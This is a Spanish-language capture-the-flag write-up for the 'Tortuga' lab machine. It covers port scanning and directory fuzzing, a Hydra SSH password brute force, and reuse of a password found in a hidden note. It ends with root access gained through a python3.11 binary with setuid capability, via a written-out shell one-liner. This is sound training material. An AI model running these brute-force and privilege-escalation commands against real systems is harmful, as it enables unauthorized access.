---
tags:
  - Cybersecurity
  - Labs
  - TheHackersLabs
  - Easy
  - HTTP
  - Hydra
  - SSH
  - PrivilegeEscalation
  - Capabilities
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Hydra|Hydra]]
	- [[#Explotación#SSH|SSH]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#Capabilities|Capabilities]]


---
# Resolviendo la máquina Tortuga

>En esta publicación, comparto cómo resolví la máquina **Tortuga** de [The Hackers Labs](https://labs.thehackerslabs.com/machine/131).

![](Screenshots/Pasted%20image%2020250913171649.png)

---
## Enumeración
### Ping

`ping -c 1 192.168.1.166`

![](Screenshots/Pasted%20image%2020250913101022.png)

*TTL=63/64* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.166 -oG allPorts`

![](Screenshots/Pasted%20image%2020250913101227.png)

`nmap -p22,80 -sCV 192.168.1.166 -oN targeted`

![](Screenshots/Pasted%20image%2020250913101254.png)
### HTTP

`http://192.168.1.166/`

![](Screenshots/Pasted%20image%2020250913101558.png)

`http://192.168.1.166/mapa.php`

![](Screenshots/Pasted%20image%2020250913101646.png)

`http://192.168.1.166/tripulacion.php`

![](Screenshots/Pasted%20image%2020250913101710.png)
#### Fuzzing Web

`gobuster dir -u http://192.168.1.166/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64`

![](Screenshots/Pasted%20image%2020250913102937.png)

`dirb http://192.168.1.166/`

![](Screenshots/Pasted%20image%2020250913103031.png)

No se encuentra ningún directorio oculto.

---
## Explotación
### Hydra

Se procede a realizar un ataque de fuerza bruta, con el usuario `grumete`. Se proporciona una pista con el mensaje: "Ey **grumete** revisa la nota oculta que dejado en tu camarote...".

`hydra -l grumete -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.166 -t 64`

![](Screenshots/Pasted%20image%2020250913103555.png)
### SSH

Se accede al servicio **SSH** (puerto 22).

`ssh grumete@192.168.1.166`

![](Screenshots/Pasted%20image%2020250913103809.png)

Se identifica la *flag* de usuario en `/home/grumete`.

En el directorio mencionado anteriormente, se encuentra un archivo oculto llamado `nota`.

`ls -la`

![](Screenshots/Pasted%20image%2020250913110508.png)

Se visualiza el archivo.

![](Screenshots/Pasted%20image%2020250913110609.png)

Se encuentra la contraseña del usuario `capitan`.
### Escalada de Privilegios

Con el comando `su capitan`, se accede al usuario `capitan`. Se puede realizar así, o también conectándonos mediante **SSH**. 
#### Capabilities

El binario `python3.11` tiene asignadas capacidades que permiten cambiar UID. Aprovechando esto, se ejecuta Python para elevar privilegios a root mediante `os.setuid(0)`.

`getcap -r / 2>/dev/null`

![](Screenshots/Pasted%20image%2020250913110919.png)

Se encuentra el binario: `/usr/bin/python3.11`, se realiza una búsqueda por [GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities).

![](Screenshots/Pasted%20image%2020250913111011.png)

`/usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/sh")'`

![](Screenshots/Pasted%20image%2020250913111102.png)

Se encuentra la *flag* de *root* en la ruta: `/root`.

Con estos pasos se completa la resolución de **Tortuga**: acceso inicial mediante fuerza bruta a `grumete`, pivot a `capitan` gracias a credenciales locales, y escalada final a *root* explotando capacidades en `python3.11`.

---